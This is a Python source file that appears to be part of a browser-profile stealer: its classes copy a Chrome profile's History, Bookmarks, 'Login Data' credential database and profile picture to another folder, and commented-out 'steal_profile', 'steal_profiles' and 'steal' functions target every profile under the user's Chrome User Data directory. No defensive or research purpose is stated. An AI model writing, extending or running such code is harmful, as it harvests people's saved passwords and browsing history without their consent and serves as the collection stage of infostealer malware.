import os
import json
#import LocalState

class ProfileFolder:
    def __init__(self, path: str):
        self.path = path

    def _copy_database(self, file_path: str, target_path: str, name: str, extension: str = ""):
        file_path = os.path.join(self.path, file_path)
        target_path = os.path.join(target_path, f"{name}.{extension}")

        with open(file_path, "rb") as original_file, open(target_path, "wb") as target_file:
            target_file.write(original_file.read())

        return target_path
    
    def _copy_json(self, file_path: str, target_path: str, name: str, extension: str = ""):
        file_path = os.path.join(self.path, file_path)
        target_path = os.path.join(target_path, f"{name}.{extension}")

        with open(file_path, "r", encoding="utf-8") as original_file, open(target_path, "w", encoding="utf-8") as target_file:
            #target_file.write(original_file.read())
            json.dump(json.load(original_file), target_file)

        return target_path

    def copy_history_database(self, path: str, name: str = "History", extension: str = ""):
        '''Copy the History file from this profile folder to a custom path'''
        return self._copy_database("History", path, name, extension)
    
    def copy_bookmarks_json(self, path: str, name: str = "Bookmarks", extension: str = ""):
        '''Copy the Bookmarks file from this profile folder to a custom path'''
        return self._copy_json("Bookmarks", path, name, extension)
    
    def copy_login_data_database(self, path: str, name: str = "Login Data", extension: str = ""):
        '''Copy the Login Data file from this profile folder to a custom path'''
        return self._copy_database("Login Data", path, name, extension)
    
    def copy_profile_picture(self, path: str, name: str = "Google Profile Picture", extension: str = "png"):
        '''Copy the Profile Picture.png file from this profile folder to a custom path'''
        return self._copy_database("Google Profile Picture.png", path, name, extension)
    
    def copy_all_files(self, path: str):
        '''Copy all the necessary files from this profile folder to a custom path (History, Bookmarks, Login Data and Profile Picture)'''
        self.copy_history_database(path)
        self.copy_bookmarks_json(path)
        self.copy_login_data_database(path)
        self.copy_profile_picture(path)
    
""" class UserDataFolder:
    def __init__(self, path: str):
        self.path = path

        self.get_local_state_session()
        self.get_profiles_folders()

    def get_local_state_session(self) -> LocalState.LocalStateSession:
        local_state_path = os.path.join(self.path, "Local State")
        self.local_state = LocalState.create_local_state_session(local_state_path)

    def get_profiles_folders(self):
        self.profiles_folders = {}

        for profile_folder_name in self.local_state.get_profiles_names():
            profile_folder_path = os.path.join(self.path, profile_folder_name)
            profile_folder = ProfileFolder(profile_folder_path)
            self.profiles_folders [profile_folder_name] = profile_folder

    def steal_profile(self, profile_name: str, path: str, name: str | None = None, profile_extension: str = "cr"):
        name = name if name else f"{self.local_state.profiles [profile_name].name} ({profile_name})"
        
        profile_folder: ProfileFolder = self.profiles_folders [profile_name]
        profile_data: LocalState.Profile = self.local_state.profiles [profile_name]

        stealed_profile_path = os.path.join(path, name)
        os.makedirs(stealed_profile_path, exist_ok=True)

        profile_folder.copy_all(stealed_profile_path)

        profile_data.save_as_file(stealed_profile_path, "Profile", profile_extension)

    def steal_profiles(self, path: str, profiles_names: list[str] | None = None):
        profiles_names = profiles_names if profiles_names else self.local_state.get_profiles_names()

        for profile_name in profiles_names:
            self.steal_profile(profile_name, path)

    # Maybe could add steal_profiles_threaded version? """

class UserDataFolder:
    def __init__(self, path: str):
        self.path = path

    def get_profile_folder(self, name: str):
        profile_path = os.path.join(self.path, name)
        return ProfileFolder(profile_path)

""" def steal(path: str):
    os.makedirs(path, exist_ok=True)
    user_data_folder = UserDataFolder(os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'))
    user_data_folder.steal_profiles(path) """

""" if __name__ == "__main__":
    steal(os.path.join("profiles", os.getlogin()))
    #open(os.path.join("profiles", os.getlogin(), )) """




    
